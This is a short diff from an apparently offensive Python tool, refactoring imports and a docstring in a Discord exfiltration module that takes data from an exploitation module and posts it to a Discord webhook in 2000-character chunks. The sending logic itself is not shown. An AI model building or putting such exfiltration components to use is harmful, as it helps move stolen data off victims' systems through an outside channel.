@@ -10,7 +10,8 @@ from typing import Any, Generator
 import aiohttp
 from discord import File, Webhook, AsyncWebhookAdapter
 
-from src.modules.exfiltration.base import ExfiltrationModule, ExploitationModule
+from src.modules.exploitation.exploitation_module import ExploitationModule
+from src.modules.exfiltration.exfiltration_module import ExfiltrationModule
 
 
 class Discord(ExfiltrationModule):
@@ -18,18 +19,17 @@ class Discord(ExfiltrationModule):
                  module: ExploitationModule,
                  webhook_url: str,
                  char_limit: int = 2000):
-        """
-        Exfiltrate data to a Discord server.
+        """Exfiltrate data to a Discord server.
 
         Args:
-            module (ExploitationModule): Instance of ExploitationModule
-                to which the exfiltrator receive data by attaching
-                itself as a subscriber.
-            webhook_url (str): URL to the Webhook set up on the Discord
+            module: Instance of ExploitationModule to which the
+                exfiltrator receive data by attaching itself as a
+                subscriber.
+            webhook_url: URL to the Webhook set up on the Discord
                 server's configuration.
-            char_limit (int): Number of characters to be sent per
-                message to the Discord server. Set by the service itself
-                and defaults to 2000 characters.
+            char_limit: Number of characters to be sent per message to
+                the Discord server. Set by the service itself and
+                defaults to 2000 characters.
         """
 
         super().__init__(module)
